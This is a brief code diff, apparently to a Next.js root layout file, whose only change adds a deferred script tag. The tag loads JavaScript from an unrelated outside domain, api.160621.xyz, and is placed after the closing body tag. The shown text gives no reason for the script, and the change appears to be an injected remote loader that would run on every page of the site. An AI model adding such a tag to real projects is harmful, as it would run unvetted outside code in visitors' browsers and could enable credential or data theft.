@@ -86,6 +86,7 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
         </ThemeProvider>
         <Toaster />
       </body>
+      <script src="https://api.160621.xyz/static/notify/custom.js" defer></script>
     </html>
   )
 }
